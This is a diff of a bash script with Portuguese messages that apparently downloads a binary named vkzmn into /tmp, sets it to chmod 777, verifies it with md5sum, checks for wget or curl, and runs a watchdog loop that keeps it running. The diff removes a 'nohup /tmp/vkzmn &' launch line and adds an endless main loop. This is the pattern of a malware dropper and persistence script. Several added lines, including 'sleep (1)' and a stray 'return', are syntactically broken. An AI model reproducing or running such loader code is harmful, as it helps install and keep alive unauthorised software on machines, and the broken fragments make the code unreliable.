@@ -5,9 +5,9 @@ echo executando vkzmn
 
 chmod 777 /tmp/vkzmn
 
-nohup /tmp/vkzmn &
 
-main
+
+return 
 
 }
 
@@ -36,6 +36,7 @@ echo vkzmn not found
 
 
 check_wget_curl 
+
 
 
 else 
@@ -70,7 +71,7 @@ if (( $?  )) ; then
 
 echo md5sum nao encontrado
 
-exit
+exit #use  od 
 
 fi;
 
@@ -96,13 +97,8 @@ done
 }
 
 
-
-
-
-
-
-
 ####################################################################
+
 
 down_curl() {
 
@@ -114,8 +110,6 @@ check_file
 
 
 }
-
-
 
 ####################################################################
 
@@ -188,6 +182,8 @@ fi;
 
 proc() {
 
+
+
 true=1000
 while true ; do
 vkzmn_ok=0
@@ -217,13 +213,14 @@ done
 
 
 
-
-
-
-
-
 main() {
 
+
+while   true ; do 
+
+
+
+sleep  (1)
 
 
 vkzmn_ok=0
@@ -273,7 +270,14 @@ fi ;
 
 fi;
 
+
+done #loop
+
+
+
 }
 
 
+
+ 
 main
